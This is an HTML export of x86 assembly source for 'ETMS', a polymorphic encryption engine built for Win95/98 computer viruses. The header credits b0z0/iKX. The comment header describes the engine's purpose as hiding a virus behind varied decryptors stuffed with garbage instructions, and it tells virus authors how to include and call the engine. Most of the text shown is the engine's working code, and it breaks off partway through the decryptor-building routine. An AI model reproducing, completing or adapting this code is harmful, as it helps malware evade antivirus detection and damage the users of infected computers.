<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;                      - expressway to my skull -</span><span class="sc0">
</span><span class="sc1">;                             [ETMS]  v0.1</span><span class="sc0">
</span><span class="sc1">;                              -b0z0/iKX-</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Intro:</span><span class="sc0">
</span><span class="sc1">;  This is a polymorphic engine for Win95/98/32 based viruses. It (not sure</span><span class="sc0">
</span><span class="sc1">; about this anyway) creates quite polymorphic decryptors that could be used</span><span class="sc0">
</span><span class="sc1">; to hide your virus or something else. Skip some lines to get a tech</span><span class="sc0">
</span><span class="sc1">; description and try to generate a few samples to see what it can do.</span><span class="sc0">
</span><span class="sc1">;  Somebody could ask which is the sense of such a name for a poly. The answer</span><span class="sc0">
</span><span class="sc1">; is simple: should there be a reason for everything? I find a lot of things</span><span class="sc0">
</span><span class="sc1">; totally nonsense, so why should poly engines have a name that could fit for</span><span class="sc0">
</span><span class="sc1">; a poly engine? I just felt like using this name for my poly and I did so. It</span><span class="sc0">
</span><span class="sc1">; is somewhat a change from the title of a Sonic Youth song named 'Expressway</span><span class="sc0">
</span><span class="sc1">; to yr skull' (named also 'The Crucifixion of Sean Penn' or 'Madonna, Sean and</span><span class="sc0">
</span><span class="sc1">; me'), a song that I like and that I found very near when I was writing this</span><span class="sc0">
</span><span class="sc1">; poly engine.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Features:</span><span class="sc0">
</span><span class="sc1">;   Basic features:</span><span class="sc0">
</span><span class="sc1">;       - Encryption using XOR/ADD/SUB/ROL/ROR on bytes/words/dwords with</span><span class="sc0">
</span><span class="sc1">;         either fixed (fixed immediate or fixed reg) or changing key</span><span class="sc0">
</span><span class="sc1">;       - Can use all registers as pointers, counters and key holders</span><span class="sc0">
</span><span class="sc1">;       - Can encrypt from start to end and from end to beginning</span><span class="sc0">
</span><span class="sc1">;       - Can create memory reference with offset (ie. [ECX + 1234h])</span><span class="sc0">
</span><span class="sc1">;       - Counter with random costants added, counts both decrementing or</span><span class="sc0">
</span><span class="sc1">;         incrementing its value</span><span class="sc0">
</span><span class="sc1">;       - Key change using XOR/ADD/SUB/ROL/ROR/INC/DEC on bytes/words/dwords</span><span class="sc0">
</span><span class="sc1">;         of the key register</span><span class="sc0">
</span><span class="sc1">;       - Quite some different ways of counting loop</span><span class="sc0">
</span><span class="sc1">;       - Some garbage is encrypted aswell</span><span class="sc0">
</span><span class="sc1">;       - Lenght of generated decryptors range somewhere between 400</span><span class="sc0">
</span><span class="sc1">;         bytes up to 4kbs</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Garbage:</span><span class="sc0">
</span><span class="sc1">;       - All the normal math, logical and comparation operations and</span><span class="sc0">
</span><span class="sc1">;         assignations on registers, immediates and memory references</span><span class="sc0">
</span><span class="sc1">;       - Moving and exchanging of registers</span><span class="sc0">
</span><span class="sc1">;       - Push of regs/imms/mem_data, pop to regs</span><span class="sc0">
</span><span class="sc1">;       - Creation of fake subroutines</span><span class="sc0">
</span><span class="sc1">;       - Conditional and unconditional jumps</span><span class="sc0">
</span><span class="sc1">;       - Usual one byte opcodes</span><span class="sc0">
</span><span class="sc1">;       - Temporary saves somewhere (to another register or to stack) important</span><span class="sc0">
</span><span class="sc1">;         registers (such as key, counter and pointer) and makes garbage with</span><span class="sc0">
</span><span class="sc1">;         them.</span><span class="sc0">
</span><span class="sc1">;       - More or less all the usual code you could find around in normal</span><span class="sc0">
</span><span class="sc1">;         programs, excepts memory writes and such. Anyway you'd better give a</span><span class="sc0">
</span><span class="sc1">;         look to some decryptors, it is not easy to write too deeply what it</span><span class="sc0">
</span><span class="sc1">;         does.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Using the poly:</span><span class="sc0">
</span><span class="sc1">;   Just add the ETMS source in your virus, simply:</span><span class="sc0">
</span><span class="sc1">;     include         etms.asm</span><span class="sc0">
</span><span class="sc1">;   Set the registers as described below and then call the poly. The poly uses</span><span class="sc0">
</span><span class="sc1">;  some data for internal purposes. This data of course is not needed to be</span><span class="sc0">
</span><span class="sc1">;  carried around with your infected file or whatever. You can just include</span><span class="sc0">
</span><span class="sc1">;  the ETMS source at the end of the file and then skip the bytes that start</span><span class="sc0">
</span><span class="sc1">;  from the label _mem_data_start. Of course you'll need to have that free</span><span class="sc0">
</span><span class="sc1">;  memory placed there at runtime.</span><span class="sc0">
</span><span class="sc1">;   The random seed (the dd at seed) should be initialized at first poly</span><span class="sc0">
</span><span class="sc1">;  run to a value between 0 and 714024.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    Calling parameters:</span><span class="sc0">
</span><span class="sc1">;       ECX     =       Lenght of things to be encrypted</span><span class="sc0">
</span><span class="sc1">;       ESI     =       Pointer to what we want to encrypt</span><span class="sc0">
</span><span class="sc1">;       EDI     =       Where to place decryptor and encrypted stuff</span><span class="sc0">
</span><span class="sc1">;       EBP     =       Offset at which decryptor will run</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    On exit:</span><span class="sc0">
</span><span class="sc1">;       EDI     =       Pointer to generated code</span><span class="sc0">
</span><span class="sc1">;       ECX     =       Lenght of generated code (decryptor + encrypted code)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Note:</span><span class="sc0">
</span><span class="sc1">;  I tried to write the poly quite clearly adding quite some comments.</span><span class="sc0">
</span><span class="sc1">; Nevertheless in some parts the code could be a bit messy or strange since</span><span class="sc0">
</span><span class="sc1">; I tried to optimize it at least a bit (like converting most of direct</span><span class="sc0">
</span><span class="sc1">; memory 32bit references to a reference [reg + off8] that are much shorter).</span><span class="sc0">
</span><span class="sc1">; I apologize for some quite messy code and if you have some problems</span><span class="sc0">
</span><span class="sc1">; understanding something, please contact me.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Contacts:</span><span class="sc0">
</span><span class="sc1">;  For any question, comment or whatever about the poly or about whatever feel</span><span class="sc0">
</span><span class="sc1">; free to mail me at cl0wn@geocities.com.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">poly</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">poly_delta</span><span class="sc0">
</span><span class="sc5">poly_delta</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; where we are running</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">poly_delta</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_inipnt</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">o_tini</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_inipnt</span><span class="sc0">         </span><span class="sc1">; save some bytes since off between</span><span class="sc0">
                                        </span><span class="sc1">; various data is a 8b</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">o_tini</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">v_lenght</span><span class="sc4">)],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">o_tini</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">v_virusp</span><span class="sc4">)],</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">o_tini</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">v_runnin</span><span class="sc4">)],</span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">o_tini</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">r_pointer</span><span class="sc4">)],</span><span class="sc2">010ffffffh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">o_tini</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_chgpnt</span><span class="sc4">)],</span><span class="sc2">01000404h</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">o_tini</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_fromend</span><span class="sc4">)],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">o_tini</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_pntoff</span><span class="sc4">)],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">o_tini</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_cntoff</span><span class="sc4">)],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">o_tini</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_inacall</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc5">bit_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">founded_first1</span><span class="sc0">                  </span><span class="sc1">; find higher bit with an 1</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">                              </span><span class="sc1">; for random memory offsets</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">bit_loop</span><span class="sc0">
</span><span class="sc5">founded_first1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">o_tini</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_memand</span><span class="sc4">)],</span><span class="sc8">cl</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">                             </span><span class="sc1">; delta</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">enc_space</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">o_tini</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_encrypt</span><span class="sc4">)],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">enc_max</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_garbage</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">r_pointer</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">init_part</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">select_register</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_register</span><span class="sc0">                    </span><span class="sc1">; get a unused register</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_used</span><span class="sc0">                        </span><span class="sc1">; mark as unusable in future</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">select_block</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_al7</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">011b</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">select_block</span><span class="sc0">                    </span><span class="sc1">; select from 01 to 03</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0ffh</span><span class="sc0">         </span><span class="sc1">; check if that stage already</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">select_block</span><span class="sc0">                    </span><span class="sc1">; done</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">           </span><span class="sc1">; save the register for that</span><span class="sc0">
                                                </span><span class="sc1">; stage</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">not_pointer</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">r_pointer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_pointer</span><span class="sc4">)],</span><span class="sc8">edi</span><span class="sc0">
                                                </span><span class="sc1">; save offset where the</span><span class="sc0">
                                                </span><span class="sc1">; pointer is initialized</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">assign_next</span><span class="sc0">

</span><span class="sc5">not_pointer</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">not_counter</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">r_pointer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_counter</span><span class="sc4">)],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">assign_next</span><span class="sc0">                     </span><span class="sc1">; assign inital counter</span><span class="sc0">

</span><span class="sc5">not_counter</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">                      </span><span class="sc1">; get key</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">r_pointer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">v_initkey</span><span class="sc4">)],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">assign_next</span><span class="sc0">                     </span><span class="sc1">; if so use key</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">unset_used</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">20h</span><span class="sc0">            </span><span class="sc1">; don't use key</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">next_loop</span><span class="sc0">
</span><span class="sc5">assign_next</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">; BL  register</span><span class="sc0">
                </span><span class="sc1">; EAX value</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">; in bl register</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">                 </span><span class="sc1">; mov base</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                           </span><span class="sc1">; the value</span><span class="sc0">

</span><span class="sc5">next_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_garbage</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">init_part</span><span class="sc0">               </span><span class="sc1">; make all init steps</span><span class="sc0">


</span><span class="sc1">; now some base assignment to a pointer, counter and key (if used) registers</span><span class="sc0">
</span><span class="sc1">; has been done. here we are gonna change a bit the various registers where</span><span class="sc0">
</span><span class="sc1">; the various things has been assigned</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_al7</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">011b</span><span class="sc0">                 </span><span class="sc1">; from 0 to 3 moves</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">decryptor_build_start</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">reg_movida</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">get_whichone</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">select_save</span><span class="sc0">             </span><span class="sc1">; select which to change (pnt,cnt,key)</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">leave_this_out</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">save_mov_xchg</span><span class="sc0">           </span><span class="sc1">; change the regs using mov or xchg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">leave_this_out</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">reg_movida</span><span class="sc0">

</span><span class="sc5">decryptor_build_start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; decryptor loop begins right here</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_chgpnt</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_chgpnt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_loopbg</span><span class="sc4">)],</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">              </span><span class="sc1">; select if starting from head or from</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0101h</span><span class="sc0">                </span><span class="sc1">; tail and if counter will dec or inc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_chgpnt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_fromend</span><span class="sc4">)],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; rnd in edx</span><span class="sc0">

        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">; add a constant to counter?</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">normal_counter</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_chgpnt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_cntoff</span><span class="sc4">)],</span><span class="sc8">eax</span><span class="sc0">
